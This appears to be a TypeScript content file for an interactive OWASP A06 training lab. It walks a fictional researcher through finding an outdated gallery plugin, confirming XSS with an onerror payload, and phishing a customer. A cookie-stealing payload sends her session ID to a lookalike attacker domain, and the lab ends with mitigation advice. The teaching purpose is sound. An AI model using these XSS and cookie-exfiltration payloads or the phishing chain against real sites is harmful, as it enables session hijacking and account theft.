export interface PageDef {
  title: string
  theory: string
  instruction: string
  hints?: { text: string }[]
  infoBox?: { label: string; content: string }
  nextLabel?: string
  customAction?: string
  requiresInteraction?: boolean
  labType: string
}

const A06_PAGES: PageDef[] = [
  // ── Page 1 ──────────────────────────────────────────────────────────────────
  {
    title: 'The Application',
    labType: 'intro-card',
    theory: `VoltMart is a growing e-commerce platform selling consumer electronics, home appliances, and gaming gear. The platform runs on an internally developed storefront engine that integrates a number of open-source third-party libraries for image galleries, payment widgets, and UI effects.

Like many fast-moving engineering teams, VoltMart's developers prioritise shipping features — and security audits can fall through the cracks. That's exactly how vulnerabilities creep in.

To proactively identify weaknesses, VoltMart's security team has launched a Bug Bounty Program — a public initiative that invites independent security researchers to responsibly disclose vulnerabilities in exchange for rewards.`,
    infoBox: {
      label: 'What is a Bug Bounty Program?',
      content: 'A bug bounty program (also called a Vulnerability Rewards Program or VRP) is a crowdsourced initiative where organizations invite ethical hackers to find and report security issues. Researchers are typically rewarded with cash or recognition depending on severity.',
    },
    instruction: 'Read the application overview, then click Next to meet your security researcher.',
  },

  // ── Page 2 ──────────────────────────────────────────────────────────────────
  {
    title: 'Kai — Security Researcher',
    labType: 'product-page',
    theory: `Kai is an independent security researcher with a background in web application penetration testing. After spotting VoltMart's bug bounty announcement, he decides to put his skills to work.

He starts his assessment the way most researchers do — passively. Before attempting any exploits, Kai simply browses VoltMart's public website, observing how it behaves and which technologies it uses.

His first target is a product listing page for a laptop.`,
    instruction: 'As Kai, browse to the VoltMart product page shown on the right, then click Next to begin your analysis.',
    hints: [
      { text: 'You don\'t need to interact with anything on this page yet — just observe the layout.' },
      { text: 'Security researchers start by understanding how the app works before probing it.' },
    ],
  },

  // ── Page 3 ──────────────────────────────────────────────────────────────────
  {
    title: 'Browse the Application',
    labType: 'product-view-source',
    nextLabel: 'View Page Source',
    theory: `Before running any tools, experienced security researchers start with manual reconnaissance — reading what the browser has already loaded.

One of the most common starting points is the page's HTML source code. Every webpage comes with a source file describing its structure, styles, and scripts. Buried inside are often clues about which third-party libraries are being used — and which versions.

Attackers use this technique to identify known-vulnerable dependencies before writing a single line of exploit code.`,
    instruction: 'As Kai, click "View Source" on the product page to open the HTML source code.',
    hints: [
      { text: 'In real browsers you can view source with Ctrl+U or by right-clicking → View Page Source.' },
      { text: 'Look for <script> tags — these reveal what JavaScript libraries the page loads.' },
    ],
  },

  // ── Page 4 ──────────────────────────────────────────────────────────────────
  {
    title: 'HTML Source Code',
    labType: 'html-source-analyze',
    requiresInteraction: true,
    customAction: 'analyze-code',
    nextLabel: 'Analyze Code',
    theory: `Reviewing an application's HTML source is a foundational technique in web security assessments. It reveals the technology stack — frameworks, plugins, analytics tools — without sending a single malicious request.

Script filenames often contain version numbers. This is a goldmine for researchers: a version number maps directly to a CVE database entry, which may describe a known exploit.`,
    instruction: 'Review the HTML source code in the panel, then click "Analyze Code" to examine Kai\'s findings.',
    hints: [
      { text: 'Script filenames often include version numbers — look for patterns like libraryname.X.X.X.min.js' },
      { text: 'The plugin of interest is the one handling image gallery functionality.' },
      { text: 'Look for the <script> tag that references glideview in the filename.' },
    ],
  },

  // ── Page 5 ──────────────────────────────────────────────────────────────────
  {
    title: 'Security Advisory',
    labType: 'cve-page',
    theory: `A CVE (Common Vulnerabilities and Exposures) entry is a standardised public record of a known security flaw. Maintained by MITRE and indexed by the National Vulnerability Database (NVD), CVEs give researchers, vendors, and defenders a shared reference point.

Each CVE includes a description of the flaw, a severity score (CVSS), and links to patches or advisories. Finding a CVE matching a library version you've spotted in the wild is a major breakthrough in any assessment.

Kai searches the NVD for GlideView and finds an advisory that matches version 2.0.4 exactly.`,
    instruction: `1. Review the security advisory loaded in the panel.\n2. Note the affected version range and attack vector.\n3. Click Next when you're ready to continue.`,
    hints: [
      { text: 'Pay attention to the affected version range — does VoltMart\'s version fall within it?' },
      { text: 'The attack requires the victim to visit a specially crafted URL. How might an attacker deliver that?' },
    ],
  },

  // ── Page 6 ──────────────────────────────────────────────────────────────────
  {
    title: 'Image Preview',
    labType: 'product-lightbox',
    requiresInteraction: true,
    theory: `Now that Kai has confirmed GlideView 2.0.4 is vulnerable, his next step is to trigger the plugin legitimately — just like a normal user would. This lets him observe how the plugin behaves and what it adds to the URL when activated.

Understanding normal behaviour is always the first step before attempting to tamper with it.`,
    instruction: 'Click the product image on the VoltMart page to launch the GlideView image gallery. Watch what happens to the URL in the address bar.',
    hints: [
      { text: 'Click directly on the laptop image in the product page.' },
      { text: 'Watch the URL bar — it updates when the gallery opens.' },
    ],
  },

  // ── Page 7 ──────────────────────────────────────────────────────────────────
  {
    title: 'Inject',
    labType: 'url-highlight',
    theory: `When the GlideView lightbox opens, the URL updates with a hash fragment: #glideview/0. The "0" refers to the index of the currently displayed image.

This is significant — the plugin reads a value directly from the URL to determine what to display. Whenever user-controlled data flows into application logic without validation, there's potential for injection.

Kai's plan: replace the "0" in the hash with a malicious payload and observe how the plugin responds.`,
    instruction: 'Take note of the URL structure shown in the panel, then click Next when you\'re ready to inject a test payload.',
  },

  // ── Page 8 ──────────────────────────────────────────────────────────────────
  {
    title: 'Script Injection',
    labType: 'url-inject',
    requiresInteraction: true,
    theory: `To test the plugin for XSS, Kai uses a classic HTML injection probe. He replaces the image index in the URL with an <img> tag carrying a JavaScript onerror handler — a script that fires when the image fails to load (which it always will, since the source is fake).

This technique is a reliable way to confirm that the application is injecting unsanitised user input into the DOM.`,
    instruction: '1. Copy the payload below.\n2. Paste it at the end of the URL in the address bar on the right.\n3. Press Enter to submit.\n\nPayload:\n,<img src=x onerror=javascript:alert(\'xss_confirmed\')>/',
    hints: [
      { text: 'You need to append the payload after the "0" in the hash fragment.' },
      { text: 'The onerror attribute runs JavaScript when an image fails to load — since src=x is invalid, it always fires.' },
      { text: 'Copy the full modified URL from the instruction panel and paste it into the address bar.' },
    ],
  },

  // ── Page 9 ──────────────────────────────────────────────────────────────────
  {
    title: 'Code Execution',
    labType: 'xss-alert',
    theory: `By inserting an <img> tag with an onerror callback into the GlideView URL hash, Kai successfully caused VoltMart's application to execute arbitrary JavaScript — without authentication and without touching the server directly.

This is Cross-Site Scripting (XSS) triggered through a vulnerable third-party component. The plugin read the attacker-controlled hash value, injected it into the DOM without sanitising it, and the browser executed it as live code.

This is exactly what OWASP A06 — Vulnerable and Outdated Components describes: a trusted third-party library introducing a critical security flaw.`,
    instruction: 'Dismiss the JavaScript alert dialog, then click Next to explore the real-world impact of this vulnerability.',
  },

  // ── Page 10 ─────────────────────────────────────────────────────────────────
  {
    title: 'Exploitation',
    labType: 'research-notes',
    theory: `A proof-of-concept alert box confirms the vulnerability exists — but it doesn't fully demonstrate the real-world risk. Security researchers need to show impact, not just presence.

To make a compelling case for VoltMart's security team, Kai decides to build a realistic attack scenario targeting another user on the platform. This will show exactly what a malicious actor — not just a researcher — could do with this vulnerability.`,
    instruction: 'Review Kai\'s research notes in the panel, then click Next to follow him as he builds his proof-of-concept attack.',
  },

  // ── Page 11 ─────────────────────────────────────────────────────────────────
  {
    title: 'Setting Up the Attack',
    labType: 'terminal-apache',
    requiresInteraction: true,
    theory: `Kai's plan is to use the XSS vulnerability to steal a logged-in user's session cookie — the token that keeps them authenticated. With that cookie, he can impersonate the victim without ever knowing their password.

The attack has three parts:
1. Create a convincing fake login page mirroring VoltMart's design
2. Register a lookalike domain (www.volt-mart.io) to host it
3. Start a webserver and monitor its access log for incoming requests`,
    instruction: 'As Kai, issue the command below in the terminal to start the webserver and begin monitoring the access log.\n\nCommand: service apache2 start && tail -f /var/log/apache2/access.log',
    hints: [
      { text: 'Type the command exactly as shown and press Enter.' },
      { text: 'The && operator chains two commands — start the server, then watch the log file.' },
    ],
  },

  // ── Page 12 ─────────────────────────────────────────────────────────────────
  {
    title: 'Malicious Email',
    labType: 'browser-email-login',
    requiresInteraction: true,
    theory: `With his infrastructure in place, Kai's next move is to deliver the malicious URL to a target user. The most common delivery method for this kind of attack is phishing — sending an email that tricks the recipient into clicking a link.

Kai crafts an email to Priya, a registered VoltMart customer. He uses a believable subject line related to the bug bounty program to add legitimacy.`,
    instruction: 'As Priya, access your email inbox by navigating to the URL shown in the panel.',
    hints: [
      { text: 'Type the email URL into the address bar and press Enter.' },
    ],
  },

  // ── Page 13 ─────────────────────────────────────────────────────────────────
  {
    title: 'Open Email',
    labType: 'email-inbox',
    requiresInteraction: true,
    theory: `Priya's inbox loads with several messages. She wouldn't normally open unsolicited emails from unknown recipients, but the subject line of Kai's message mentions a security issue on VoltMart — a topic she's curious about as an active customer.`,
    instruction: 'As Priya, open the email from Kai in the inbox.',
    hints: [
      { text: 'Click the email from Kai to open it.' },
    ],
  },

  // ── Page 14 ─────────────────────────────────────────────────────────────────
  {
    title: 'Email Content',
    labType: 'email-content',
    theory: `Kai's email is carefully worded to appear legitimate. He references VoltMart's bug bounty program (which is real), uses formal language, and embeds what appears to be a genuine VoltMart product URL.

At a quick glance, the URL looks completely normal — it begins with the real voltmart.io domain. The malicious payload is buried inside the hash fragment at the end, where most users never look.`,
    instruction: 'Review the email content carefully, then click Next to analyse the URL in detail.',
    hints: [
      { text: 'Read the URL in the email closely. Does the domain look exactly right?' },
    ],
  },

  // ── Page 15 ─────────────────────────────────────────────────────────────────
  {
    title: 'URL Analysis',
    labType: 'email-url-click',
    requiresInteraction: true,
    theory: `The link in Kai's email is the same VoltMart product URL from earlier — but with a crafted payload in the hash:

window.open('http://volt-mart.io?sid=' + document.cookie)

If Priya clicks this link while logged into VoltMart, the XSS vulnerability in GlideView will fire the onerror handler. The JavaScript will then:
1. Read her browser's session cookie for voltmart.io
2. Append it to a URL pointing to Kai's fake site (volt-mart.io)
3. Silently redirect her browser there, exposing her session ID

Because the link starts with the real voltmart.io domain, a quick glance makes it look legitimate.`,
    instruction: 'As Priya, click the URL highlighted in the email.',
    hints: [
      { text: 'Click the highlighted link in the email body.' },
    ],
  },

  // ── Page 16 ─────────────────────────────────────────────────────────────────
  {
    title: 'Redirected',
    labType: 'fake-site',
    theory: `The moment Priya clicks the link, her browser loads the VoltMart product page. The GlideView plugin processes the hash fragment, encounters the <img> tag, injects it into the DOM, and the onerror callback fires instantly — all before Priya sees anything unusual.

Her browser silently redirects to http://volt-mart.io with her session cookie appended as a URL parameter. Priya is now looking at Kai's fake VoltMart login page, thinking she was redirected due to a session timeout.`,
    instruction: 'Review the fake VoltMart page Priya has landed on, then click Next to check Kai\'s server logs.',
  },

  // ── Page 17 ─────────────────────────────────────────────────────────────────
  {
    title: 'Access Logs',
    labType: 'terminal-logs',
    requiresInteraction: true,
    theory: `Back in Kai's terminal, his Apache access log has captured the incoming request triggered by Priya's browser — automatically, without any further action from Priya.

The log entry contains far more than just an IP address. Let's look closely at what was captured.`,
    instruction: 'Click "Analyze Output" to examine the Apache access log entry.',
    hints: [
      { text: 'Click the "Analyze Output" button to open the analysis panel.' },
      { text: 'Use the toggle arrows to navigate between the two observations.' },
    ],
  },

  // ── Page 18 ─────────────────────────────────────────────────────────────────
  {
    title: 'Credential Theft',
    labType: 'session-hijack',
    theory: `With Priya's session ID captured in his access logs, Kai can now open VoltMart in his own browser, inject her cookie using browser developer tools, and gain full access to her account — her saved addresses, order history, stored payment methods, and personal details — all without ever knowing her password.

This entire attack chain was made possible by a single outdated library: GlideView 2.0.4. A version that had a public patch available for over a year.`,
    instruction: 'Review what happened in the panel, then click Next to learn how to prevent this.',
  },

  // ── Page 19 ─────────────────────────────────────────────────────────────────
  {
    title: 'Mitigation',
    labType: 'mitigation',
    nextLabel: 'Complete Chapter',
    theory: `Component-based vulnerabilities arise when an application depends on libraries, frameworks, or plugins that are outdated, unpatched, or no longer maintained. The attack doesn't target your own code — it exploits trust in someone else's.

In VoltMart's case, upgrading GlideView from 2.0.4 → 2.1.0 would have eliminated this vulnerability entirely. One version bump. One patched dependency. A completely different outcome for Priya.`,
    instruction: 'Review the mitigation strategies in the panel, then click "Complete Chapter" to finish.',
  },
]

export default A06_PAGES
